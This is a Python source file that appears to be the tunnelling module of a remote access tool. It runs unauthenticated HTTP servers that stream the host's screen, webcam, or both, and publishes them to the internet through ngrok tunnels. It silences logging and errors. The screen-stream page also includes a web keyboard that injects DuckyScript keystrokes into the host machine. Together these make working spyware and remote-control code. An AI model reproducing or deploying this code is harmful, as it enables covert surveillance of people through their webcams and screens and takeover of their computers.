from io import BytesIO
from pyngrok import ngrok
from http.server import HTTPServer
from socketserver import ThreadingMixIn
from urllib.parse import urlparse, parse_qs
from http.server import BaseHTTPRequestHandler, HTTPServer

#Misc
import numpy as np
from threading import Thread
from .duckyscript import toducky
from pyautogui import screenshot
from cv2 import cvtColor, resize, imencode, COLOR_BGR2RGB, VideoCapture


"""
ooooooooooooo                                               oooo  ooooo   ooooo                             .o8  oooo   o8o
8'   888   `8                                               `888  `888'   `888'                            "888  `888   `"'
     888      oooo  oooo  ooo. .oo.   ooo. .oo.    .ooooo.   888   888     888   .oooo.   ooo. .oo.    .oooo888   888  oooo  ooo. .oo.    .oooooooo
     888      `888  `888  `888P"Y88b  `888P"Y88b  d88' `88b  888   888ooooo888  `P  )88b  `888P"Y88b  d88' `888   888  `888  `888P"Y88b  888' `88b
     888       888   888   888   888   888   888  888ooo888  888   888     888   .oP"888   888   888  888   888   888   888   888   888  888   888
     888       888   888   888   888   888   888  888    .o  888   888     888  d8(  888   888   888  888   888   888   888   888   888  `88bod8P'
    o888o      `V88V"V8P' o888o o888o o888o o888o `Y8bod8P' o888o o888o   o888o `Y888""8o o888o o888o `Y8bod88P" o888o o888o o888o o888o `8oooooo.
                                                                                                                                         d"     YD
                                                                                                                                         "Y88888P'
"""
class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    daemon_threads = True
    def handle_error(self, request, client_address):
        pass

class ScreenStreamHandler(BaseHTTPRequestHandler):
    def __init__(self, request, client_address, server):
        self.action_table = {
            "ducky": self.run_ducky
        }
        super().__init__(request, client_address, server)

    def run_ducky(self, payload: str) -> None:
        Thread(target=toducky, args=(payload, True)).start()

    def log_message(self, format, *args):
        pass

    def do_GET(self):
        parsed = urlparse(self.path)
        if parsed.path == '/':
            html = b"""\
<!DOCTYPE html>
<html>
<head>
    <title>Screen Stream</title>
    <meta charset="utf-8">

    <style>
        body {
            background-color: #1e1e1e;
            color: #eee;
            font-family: sans-serif;
            text-align: center;
            padding-top: 20px;
        }

        img {
            border: 4px solid #444;
            border-radius: 10px;
            width: 80%;
            max-width: 900px;
            box-shadow: 0 0 15px #000;
        }

        #keyboard {
            margin-top: 25px;
            display: inline-block;
            user-select: none;
        }

        .row {
            display: flex;
            justify-content: center;
            margin-bottom: 6px;
        }

        .key {
            background: #333;
            color: #eee;
            border-radius: 6px;
            width: 42px;
            height: 42px;
            line-height: 42px;
            margin: 3px;
            cursor: pointer;
            font-size: 13px;
        }

        .key:hover { background: #555; }

        .wide { width: 90px; }
        .xwide { width: 130px; }
        .space { width: 260px; }

        .active {
            background: #777 !important;
        }
    </style>
</head>

<body>

<h1>Live Screen Stream</h1>
<img src="/video" alt="Screen stream">

<div id="keyboard"></div>

<script>
let caps = false;
let modifiers = [];

function sendDucky(cmd) {
    fetch("/cmd?action=ducky&payload=" + encodeURIComponent(cmd));
}

function pressKey(key) {
    let ducky = "";

    if (key === "CAPS") {
        caps = !caps;
        sendDucky("CAPSLOCK");
        document.getElementById("caps").classList.toggle("active", caps);
        return;
    }

    if (["CTRL","ALT","SHIFT","GUI"].includes(key)) {
        if (modifiers.includes(key)) {
            modifiers = modifiers.filter(k => k !== key);
            sendDucky(key); // send standalone modifier if toggled off
        } else {
            modifiers.push(key);
        }
        document.getElementById(key).classList.toggle("active");
        return;
    }

    if (modifiers.length) {
        ducky = modifiers.join(" ") + " " + key;
        modifiers.forEach(m => document.getElementById(m).classList.remove("active"));
        modifiers = [];
    } else if (key.length === 1) {
        ducky = "STRING " + (caps ? key.toUpperCase() : key.toLowerCase());
    } else {
        ducky = key;
    }

    sendDucky(ducky);
}

const layout = [
    ["ESC","F1","F2","F3","F4","F5","F6","F7","F8","F9","F10","F11","F12"],
    ["`","1","2","3","4","5","6","7","8","9","0","-","=","BACKSPACE"],
    ["TAB","Q","W","E","R","T","Y","U","I","O","P","[","]","\\\\"],
    ["CAPS","A","S","D","F","G","H","J","K","L",";","'","ENTER"],
    ["SHIFT","Z","X","C","V","B","N","M",",",".","/","SHIFT"],
    ["CTRL","GUI","ALT","SPACE","ALT","GUI","CTRL"],
    ["UP"],
    ["LEFT","DOWN","RIGHT"]
];

const keyboard = document.getElementById("keyboard");

layout.forEach(row => {
    const rowDiv = document.createElement("div");
    rowDiv.className = "row";

    row.forEach(key => {
        const k = document.createElement("div");
        k.className = "key";
        k.textContent = key;
        k.onclick = () => pressKey(key);

        if (["BACKSPACE","ENTER","SHIFT","CAPS","TAB"].includes(key))
            k.classList.add("wide");

        if (key === "SPACE")
            k.classList.add("space");

        if (key === "CAPS")
            k.id = "caps";
        if (["CTRL","ALT","SHIFT","GUI"].includes(key)) k.id = key;

        rowDiv.appendChild(k);
    });

    keyboard.appendChild(rowDiv);
});
</script>

</body>
</html>

            """
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.send_header('Content-length', str(len(html)))
            self.end_headers()
            self.wfile.write(html)

        elif parsed.path == '/video':
            self.send_response(200)
            self.send_header('Content-type', 'multipart/x-mixed-replace; boundary=frame')
            self.end_headers()
            try:
                while True:
                    screenshot_out = screenshot()
                    with BytesIO() as output:
                        screenshot_out.save(output, format="JPEG")
                        frame = output.getvalue()
                    self.wfile.write(b"--frame\r\n")
                    self.wfile.write(b"Content-Type: image/jpeg\r\n\r\n" + frame + b"\r\n")
            except (BrokenPipeError, ConnectionResetError):
                pass

        elif parsed.path == '/cmd':
            params = parse_qs(parsed.query)
            action = params.get('action', [None])[0]
            payload = params.get('payload', [""])[0]

            if not(action in self.action_table):
                self.send_error(400, "Invalid action")
                return
            fun = self.action_table[action]
            fun(payload)

            self.send_response(204)
            self.end_headers()
            return

        else:
            self.send_error(404)

def webcamandscreenstreamhandlermaker(cap):
    class WebcamAndScreenStreamHandler(BaseHTTPRequestHandler):
        def log_message(self, format, *args):
            pass

        def do_GET(self):
            if self.path == '/':
                html = b"""\
                <!DOCTYPE html>
                <html>
                <head>
                    <title>Webcam&Screen Stream</title>
                    <style>
                        body {
                            background-color: #000;
                            color: #fff;
                            font-family: sans-serif;
                            text-align: center;
                            margin: 0;
                            padding: 2em;
                        }
                        img {
                            border: 6px solid #444;
                            border-radius: 12px;
                            width: 80%%;
                            max-width: 960px;
                            box-shadow: 0 0 20px #000;
                        }
                    </style>
                </head>
                <body>
                    <h1>Live Webcam&Screen Stream</h1>
                    <img src="/video" alt="Webcam stream">
                </body>
                </html>
                """
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.send_header('Content-length', str(len(html)))
                self.end_headers()
                self.wfile.write(html)

            elif self.path == '/video':
                cap.open(0)
                self.send_response(200)
                self.send_header('Content-type', 'multipart/x-mixed-replace; boundary=frame')
                self.end_headers()
                try:
                    while cap.isOpened():
                        img = screenshot()
                        img = np.array(img)
                        img = cvtColor(img, COLOR_BGR2RGB)
                        ret, frame = cap.read()
                        fr_height, fr_width, _ = frame.shape
                        frame = resize(frame, (fr_width//2, fr_height//2))
                        fr_height, fr_width, _ = frame.shape
                        img[0:fr_height, 0:fr_width, :] = frame[0:fr_height, 0:fr_width, :]
                        if not ret:
                            continue
                        _, jpeg = imencode('.jpg', img)
                        self.wfile.write(b"--frame\r\n")
                        self.wfile.write(b"Content-Type: image/jpeg\r\n\r\n" + jpeg.tobytes() + b"\r\n")
                except (BrokenPipeError, ConnectionResetError):
                    pass
            else:
                self.send_error(404)
    return WebcamAndScreenStreamHandler

def webcamstreamhandlermaker(cap):
    class WebcamStreamHandler(BaseHTTPRequestHandler):
        def log_message(self, format, *args):
            pass

        def do_GET(self):
            if self.path == '/':
                html = b"""\
                <!DOCTYPE html>
                <html>
                <head>
                    <title>Webcam Stream</title>
                    <style>
                        body {
                            background-color: #000;
                            color: #fff;
                            font-family: sans-serif;
                            text-align: center;
                            margin: 0;
                            padding: 2em;
                        }
                        img {
                            border: 6px solid #444;
                            border-radius: 12px;
                            width: 80%%;
                            max-width: 960px;
                            box-shadow: 0 0 20px #000;
                        }
                    </style>
                </head>
                <body>
                    <h1>Live Webcam Stream</h1>
                    <img src="/video" alt="Webcam stream">
                </body>
                </html>
                """
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.send_header('Content-length', str(len(html)))
                self.end_headers()
                self.wfile.write(html)
            elif self.path == '/video':
                cap.open(0)
                self.send_response(200)
                self.send_header('Content-type', 'multipart/x-mixed-replace; boundary=frame')
                self.end_headers()
                try:
                    while cap.isOpened():
                        ret, frame = cap.read()
                        if not ret:
                            continue
                        _, jpeg = imencode('.jpg', frame)
                        self.wfile.write(b"--frame\r\n")
                        self.wfile.write(b"Content-Type: image/jpeg\r\n\r\n" + jpeg.tobytes() + b"\r\n")
                except (BrokenPipeError, ConnectionResetError):
                    pass
            else:
                self.send_error(404)
    return WebcamStreamHandler


class MJPEGServer:
    def __init__(self, port=8081, handler=None):
        self.port = port
        self.handler = handler
        self.server = None
        self.tunnel = None

    def start(self):
        self.server = ThreadedHTTPServer(('0.0.0.0', self.port), self.handler)
        Thread(target=self.server.serve_forever, daemon=True).start()
        self.tunnel = ngrok.connect(self.port, "http")
        return self.tunnel.public_url

    def stop(self):
        if self.tunnel:
            ngrok.disconnect(self.tunnel.public_url)
        if self.server:
            self.server.shutdown()
class TunnelManager:
    def __init__(self):
        self.services = {}

    def start_screen_stream(self, name="screen", port=8081):
        server = MJPEGServer(port, ScreenStreamHandler)
        url = server.start()
        self.services[name] = server
        return url

    def start_webcam_stream(self, name="webcam", port=8082, cap=VideoCapture(0)):
        server = MJPEGServer(port, webcamstreamhandlermaker(cap))
        url = server.start()
        self.services[name] = server
        return url

    def start_webcam_and_screen_stream(self, name="webcamandscreen", port=8023, cap=VideoCapture(0)):
        server = MJPEGServer(port, webcamandscreenstreamhandlermaker(cap))
        url = server.start()
        self.services[name] = server
        return url

    def stop_service(self, name):
        if name in self.services:
            self.services[name].stop()
            del self.services[name]
            return True
        return False

    def list_services(self):
        return list(self.services.keys())